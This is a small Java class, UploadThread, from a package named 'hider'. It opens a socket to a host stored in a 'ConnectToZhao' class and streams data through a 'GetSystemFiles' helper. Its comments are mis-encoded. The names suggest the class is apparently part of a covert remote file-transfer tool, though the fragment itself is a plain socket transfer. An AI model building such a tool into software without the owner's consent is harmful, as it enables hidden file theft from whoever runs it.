package com.hider;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.IOException;
import java.net.Socket;

public class UploadThread extends Thread{
	
	private BufferedOutputStream fileOut;
	private int uploadPort;

	
	public UploadThread(BufferedOutputStream fileOut,int uploadPort) {
		// TODO Auto-generated constructor stub
		this.fileOut = fileOut;
		this.uploadPort = uploadPort;
		
	}
	
	public void run() {
		
	
		try {
			
			
			//�����ϴ�Socket
			Socket uploadSocket = new Socket(ConnectToZhao.host, uploadPort);
			BufferedInputStream input = new BufferedInputStream(uploadSocket.getInputStream());
			GetSystemFiles.upload(fileOut, input);
			//�ϴ���ϣ��ر�Socket
			uploadSocket.close();
		} catch (NumberFormatException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}

	}

	

}
